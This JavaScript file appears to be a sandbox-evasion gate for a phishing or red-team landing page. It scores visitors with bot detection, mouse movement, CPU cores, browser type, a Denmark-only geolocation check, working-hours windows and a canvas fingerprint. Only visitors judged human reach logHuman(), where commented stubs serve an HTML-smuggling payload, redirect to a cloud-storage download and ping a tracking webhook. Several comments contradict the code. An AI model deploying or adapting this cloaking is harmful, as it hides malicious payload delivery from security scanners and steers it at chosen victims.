import * as Botd from './botd.js';

var botdResult = true;
var hasMouseMoved = false;
var hasKeyPressed = false;


document.addEventListener('mousemove', () => hasMouseMoved = true, { once: true });
document.addEventListener('keypress', () => hasKeyPressed = true, { once: true });

async function logHuman(){

    // serve payload (html smuggling)
    // ...
    
    // serve payload (redirect to cloud storage link)
    // window.location.replace(
    //    "https://example.com/",
    // );

    // webhook
    // fetch("https://example.com?id=???"); 
    


	document.getElementById("result").innerHTML = "You are: human ";
}

function isHuman(botdResult, ipInfo){

    const ipCheckResult = isValidGeolocation(ipInfo);
    const userAgentCheckResult = isValidUserAgent();
    const workingHoursResult = workingHours();
    const canvasFingerprintResult = isValidCanvasFingerprint();

    console.log('botd result: '+ botdResult.bot);
    console.log('mouse result: '+ hasMouseMoved);
    console.log('keypress result: '+ hasKeyPressed);
    console.log('logical CPU cores: ' + navigator.hardwareConcurrency);
    console.log('IP check: ', ipCheckResult);
    console.log('User-Agent: ', userAgentCheckResult);
    console.log('workingHours: ', workingHoursResult);
    console.log('Canvas Fingerprint: ', canvasFingerprintResult);

    // definately human
    if(hasMouseMoved ){
        logHuman();
    }
    // most probably human with ip check
    // if(!botdResult.bot && navigator.hardwareConcurrency > 2 && ipCheckResult && userAgentCheckResult && workingHoursResult){
    //     logHuman();
    // }
    if(!botdResult.bot && navigator.hardwareConcurrency > 2 && userAgentCheckResult && workingHoursResult && canvasFingerprintResult){
        logHuman();
    }
    else{
        document.getElementById("result").innerHTML = "You are: bot ";
    }
}

function isValidGeolocation(ipInfo) {
    // Example check: ensure IP is not from a known data center or suspicious location
    console.log(ipInfo.country_name);
    const targetCountry = "Denmark";
    return targetCountry.includes(ipInfo.country_name);

}

function isValidUserAgent() {
    const userAgent = navigator.userAgent.toLowerCase();
    const whitelist = [
        'edg',       // Edge
        'chrome',    // Chrome, Chromium, Brave
        'firefox',   // Firefox
        'safari',    // Safari
    ];

    return whitelist.some(keyword => userAgent.includes(keyword));
}

async function fetchIPInfo(){
    const response = await fetch('http://api.ipgeolocation.io/ipgeo?apiKey=<redacted>');
    const data = await response.json();
    return data;
}

function workingHours() {
    const now = new Date();
    const dayOfMonth = now.getDate(); // 1 to 31
    const month = now.getMonth(); // 0 = January, 1 = February, ..., 11 = December
    const year = now.getFullYear();
    const hours = now.getHours();
    const minutes = now.getMinutes();

    // Customize these arrays and variables according to your requirements
    const allowedDaysRange = { start: 12, end: 18 }; // Monday to Friday
    const allowedMonths = [0, 1, 2, 5, 6, 11]; // jun(0) - dec(11) 
    const allowedYears = [2023, 2024];
    const startHour = 7;
    const endHour = 18;

    // Check if the current day, month, and year are within the allowed ranges
    const isDayAllowed = dayOfMonth >= allowedDaysRange.start && dayOfMonth <= allowedDaysRange.end;
    const isMonthAllowed = allowedMonths.includes(month);
    const isYearAllowed = allowedYears.includes(year);
    
    // Check if the current time is within the allowed working hours
    const isTimeAllowed = (hours > startHour || (hours === startHour && minutes >= 0)) &&
                          (hours < endHour || (hours === endHour && minutes <= 0));
    
    console.log(isDayAllowed , isMonthAllowed , isYearAllowed, isTimeAllowed)
    
    return isDayAllowed && isMonthAllowed && isYearAllowed && isTimeAllowed;
}

function generateCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');

    // Draw some text
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.textBaseline = 'alphabetic';
    ctx.fillStyle = '#f60';
    ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = '#069';
    ctx.fillText('Hello, World!', 2, 15);
    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
    ctx.fillText('Hello, World!', 4, 17);

    // Draw a rectangle
    ctx.strokeStyle = 'rgba(120, 186, 176, 0.5)';
    ctx.strokeRect(50, 50, 100, 100);

    // Additional drawing to make fingerprint more unique
    ctx.beginPath();
    ctx.arc(75, 75, 50, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.stroke();

    // Get the data URL
    const dataURL = canvas.toDataURL();
    return dataURL;
}

function hashString(str) {
    let hash = 0;
    if (str.length === 0) return hash;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = (hash << 5) - hash + char;
        hash |= 0; // Convert to 32bit integer
    }
    return hash;
}

function isValidCanvasFingerprint() {
    const fingerprint = generateCanvasFingerprint();
    const fingerprintHash = hashString(fingerprint);

    console.log('Canvas Fingerprint Hash:', fingerprintHash);

    // Example logic: If the hash matches known human browser hash patterns, it's a human
    const knownHumanHashes = [
        // These hashes should be precomputed from known human browsers
        -2051175225,  // Example hash, replace with actual hashes
        1234567890    // Example hash, replace with actual hashes
    ];

    return knownHumanHashes.includes(fingerprintHash);
}


// Initialize an agent at application startup, once per page/app.
const botdPromise = Botd.load()
// Get detection results when you need them.
botdPromise
    .then((botd) => botd.detect())
    .then((tmpResult) => botdResult=tmpResult)
    .catch((error) => console.error(error))


fetchIPInfo().then(ipInfo => {
    setTimeout(isHuman, 2000, botdResult, ipInfo);
}).catch(error => {
    console.error('Failed to fetch IP info', error);
    setTimeout(isHuman, 2000, botdResult, {});
});
